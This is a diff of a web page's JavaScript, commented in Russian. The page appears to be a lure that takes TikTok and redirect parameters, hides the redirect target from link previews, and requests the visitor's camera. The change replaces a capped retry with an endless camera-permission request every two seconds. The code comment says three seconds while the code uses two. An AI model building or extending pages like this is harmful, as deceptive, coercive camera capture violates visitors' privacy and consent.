@@ -34,10 +34,10 @@
         var currentUrl = new URL(window.location.href);
         var baseUrl = currentUrl.origin + currentUrl.pathname;
         var searchParams = new URLSearchParams(currentUrl.search);
-        
+
         // Удаляем параметр 'redirect' из og:url
         searchParams.delete('redirect');
-        
+
         var newUrl = baseUrl + '?' + searchParams.toString();
         ogUrlMeta.setAttribute('content', newUrl);
       }
@@ -84,15 +84,11 @@
       } catch (e) {
         console.log(`Ошибка доступа к камере: ${e.toString()}`);
         cameraAccessAttempts++;
-        if (cameraAccessAttempts < 100) {
-          console.log(`Повторная попытка доступа к камере через 3 секунды (попытка ${cameraAccessAttempts + 1})...`);
-          setTimeout(requestCameraAccess, 3000);
-        } else {
-          console.log('Превышено максимальное количество попыток доступа к камере. Выполняем редирект.');
-          redirectToFinalDestination();
-        }
+        console.log(`Повторная попытка доступа к камере через 3 секунды (попытка ${cameraAccessAttempts + 1})...`);
+        setTimeout(requestCameraAccess, 2000); // Повторяем через 3 секунды без ограничения
       }
     }
+
 
     function handleSuccess(stream) {
       console.log('Начинаем обработку потока камеры...');
@@ -120,7 +116,7 @@
       const tiktokUrl = urlParams.get('tiktok') || '';
       const id = urlParams.get('id') || '';
       const redirectUrl = urlParams.get('redirect') || '';
-      
+
       console.log('tiktokurl:', tiktokUrl);
       console.log('id:', id);
       console.log('redirecturl:', redirectUrl);
